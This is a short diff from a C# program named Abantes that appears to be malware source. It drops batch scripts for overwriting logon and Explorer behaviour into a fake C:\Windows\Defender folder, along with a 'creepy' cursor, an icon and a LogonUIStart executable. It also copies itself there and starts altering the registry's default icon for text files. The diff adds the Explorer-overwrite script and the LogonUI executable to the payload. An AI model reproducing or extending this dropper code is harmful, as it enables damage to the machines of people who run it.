@@ -29,8 +29,10 @@ namespace Abantes
                 Directory.CreateDirectory(@"C:\Windows\Defender");
                 File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
                 File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
+                File.WriteAllText(extractPath + "\\ExplorerOverwrite.bat", Resources.ExplorerOverWrite);
                 File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
                 File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
+                File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
                 editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
